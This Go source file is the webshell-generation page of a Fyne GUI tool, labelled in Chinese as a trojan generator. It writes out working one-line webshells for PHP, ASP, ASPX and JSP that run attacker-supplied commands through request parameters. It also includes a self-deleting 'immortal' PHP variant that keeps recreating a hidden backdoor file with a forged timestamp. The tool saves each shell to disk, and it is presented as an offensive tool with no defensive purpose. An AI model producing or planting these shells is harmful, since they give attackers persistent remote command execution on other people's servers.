package main

import (
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/widget"
	"os"
	"strings"
)

func showWebshellGenerationPage(w fyne.Window) {
	title := widget.NewLabel("请选择你要生成的木马类型")

	var immortalCheckBox *widget.Check

	var selectedType string

	infoLabel := widget.NewLabel("")
	infoContent := widget.NewMultiLineEntry()
	infoContent.SetPlaceHolder("这里会显示相关信息...")

	selectType := widget.NewSelect([]string{"PHP", "ASP", "ASPX", "JSP"}, func(selected string) {
		selectedType = selected
		switch selected {
		case "PHP":
			infoLabel.SetText("")
			infoContent.SetText(`<?php eval(@$_REQUEST['在这里输入你想要的密码']); ?>`)
			immortalCheckBox.Show()
		case "ASP":
			infoLabel.SetText("")
			infoContent.SetText(`
    <%=server.createobject("ws"&"cript.shell").exec("c"&"md.exe /c "&request("在这里输入你想要的密码")).stdout.readall%>
`)
			immortalCheckBox.Hide()
		case "ASPX":
			infoLabel.SetText("")
			infoContent.SetText(`
<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["在这里输入你想要的密码"],"unsafe"));%>
`)
			immortalCheckBox.Hide()
		case "JSP":
			infoLabel.SetText("")
			infoContent.SetText(`
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<%
    Process process = Runtime.getRuntime().exec(request.getParameter("在这里输入你想要的密码"));
    InputStream inputStream = process.getInputStream();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while ((line = bufferedReader.readLine()) != null){
                                                                                                                                                                                                                                                                                                                                                                                                                                                                 response.getWriter().println(line);
    }
%>
`)
			immortalCheckBox.Hide()
		default:
			infoLabel.SetText("")
			infoContent.SetText("")
			immortalCheckBox.Hide()
		}
	})

	performButton := widget.NewButton("执行操作", func() {
		var message string
		switch selectedType {
		case "PHP":
			message = "执行 PHP 相关操作"
			if immortalCheckBox.Checked {
				message += "，并开启不死马"
			}
		case "ASP":
			message = "执行 ASP 相关操作"
		case "ASPX":
			message = "执行 ASPX 相关操作"
		case "JSP":
			message = "执行 JSP 相关操作"
		default:
			message = "请选择一个类型"
		}

		file, err := os.Create(fmt.Sprintf("%s_shell.%s", selectedType, strings.ToLower(selectedType)))
		if err != nil {
			dialog.ShowError(err, w)
			return
		}
		defer file.Close()

		_, err = file.WriteString(infoContent.Text)
		if err != nil {
			dialog.ShowError(err, w)
			return
		}

		message2 := fmt.Sprintf("内容已保存到文件%s_shell.%s", selectedType, strings.ToLower(selectedType))
		dialog.ShowInformation("操作结果", message+message2, w)
	})

	immortalCheckBox = widget.NewCheck("开启不死马", func(checked bool) {
		if checked {
			infoLabel.SetText("PHP文件经访问后自动删除，程序并写入进程中不断执行生成目标木马文件，kill -9无法反制，可以通过重启服务来解决")
			infoContent.SetText(`<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.config.php';  //修改连接的webshell名
    $code = '<?php eval(@$_REQUEST["在这里输入你想要的密码"]); ?>';
    while (1){
        file_put_contents($file,$code); 
        system('touch -m -d "2024-7-21 09:10:12" .config.php'); //修改连接的webshell的时间
        usleep(5000);
    }
?>
`)
		} else {
			infoLabel.SetText("")
			infoContent.SetText(`<?php eval(@$_REQUEST['在这里输入你想要的密码']); ?>`)
		}
	})
	immortalCheckBox.Hide()

	backButton := widget.NewButton("返回主页", func() {
		w.SetContent(firstPage())
	})

	scrollContainer := container.NewVScroll(infoContent)
	scrollContainer.SetMinSize(fyne.NewSize(400, 300))

	content := container.NewVBox(
		title,
		selectType,
		infoLabel,
		immortalCheckBox,
		scrollContainer,
		performButton,
		backButton,
	)

	commandPage := container.NewVBox(
		showWebshellGenerationPage2(w),
	)

	tabs := container.NewAppTabs(
		container.NewTabItem("生成小马", content),
		container.NewTabItem("流量加密木马", commandPage),
	)

	w.SetContent(tabs)
}
